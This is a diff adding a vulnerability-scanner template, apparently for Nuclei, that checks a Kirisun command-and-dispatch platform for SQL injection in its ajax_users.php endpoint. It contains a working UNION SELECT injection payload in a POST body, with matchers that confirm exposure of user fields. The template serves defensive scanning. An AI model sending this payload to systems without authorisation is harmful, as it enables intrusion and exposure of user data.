@@ -1,0 +1,29 @@
+id: poc-yaml-kirisun-ajax-users-php-sqli
+info:
+  name: 福建科立讯通信 指挥调度管理平台 ajax_users.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL injection vulnerability in the 科立讯指挥调度管理平台 ajax_users.php endpoint.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/app/ext/ajax_users.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,{{t2}},0x7e),NULL,NULL,NULL-- -"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, '\"usr_uuid\"')"
+          - "contains(body, '\"usr_number\"')"
+          - "contains(body, t2)"
+          - "!contains(body, '<')"
